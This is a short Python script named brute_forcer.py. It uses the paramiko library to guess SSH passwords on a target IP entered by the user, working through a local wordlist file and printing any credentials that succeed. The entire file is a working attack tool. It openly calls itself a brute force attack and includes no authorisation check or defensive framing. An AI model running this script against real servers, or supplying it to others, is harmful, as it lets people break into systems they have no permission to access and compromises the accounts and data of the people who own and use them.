# brute_forcer.py
import paramiko

def brute_force_ssh(target_ip, username, wordlist_file):
    print(f"[+] Starting SSH Brute Force Attack on {target_ip} with username: {username}")

    try:
        with open(wordlist_file, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[-] Wordlist file not found: {wordlist_file}")
        return

    for password in passwords:
        password = password.strip()
        try:
            print(f"[*] Trying password: {password}")
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password, timeout=3)
            print(f"[+] Success! Username: {username} | Password: {password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"[-] Failed login for: {username}:{password}")
        except paramiko.SSHException:
            print("[!] Connection issue, retrying...")
        except Exception as e:
            print(f"[!] Error: {e}")

    print("[*] Brute force attack completed.")

def start_brute_force():
    target_ip = input("Enter target IP: ")
    username = input("Enter SSH username: ")
    wordlist_file = "wordlist.txt"  # Wordlist file in same directory
    brute_force_ssh(target_ip, username, wordlist_file)
